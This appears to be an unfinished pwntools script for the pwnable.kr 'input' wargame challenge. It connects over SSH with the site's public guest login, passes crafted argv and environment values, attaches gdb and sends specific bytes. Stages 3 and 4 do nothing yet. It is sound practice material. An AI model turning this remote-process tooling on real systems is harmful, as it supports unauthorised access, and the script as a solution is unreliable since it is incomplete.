from pwn import *
from py_console import console

context.log_level = 'debug'
context.terminal = ['vscode', '-e', 'sh', '-c']
#context(arch = 'i386', os = 'linux')

# Stage 1
argv_str = "cccc "*99
argv = argv_str.split(" ")
argv[65] = "\x00"
argv[66] = "\x20\x0a\x0d"
shell = ssh(host='pwnable.kr', user="input2", password='guest', port=2222)
p = shell.process(executable='/home/input2/input', argv=argv, env={"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"})
gdb.attach(p, '''
set follow-fork-mode child
break *0x0000000000400ae3
continue
i r
''')
console.info(p.recvuntil(":)\n").decode())
console.success(p.recvline().decode())

# Stage 2
p.send("\x00\x0a\x00\xff")
p.send("\x00\x0a\x02\xff")
console.success(p.recvline().decode())

# Stage 3
console.success(p.recvline().decode())

# Stage 4
#fileStr = FileStructure("\x0a")
#fileStr.vtable = "\x00\x00\x00\x00"
#p.send(fileStr)
console.success(p.recvline().decode())
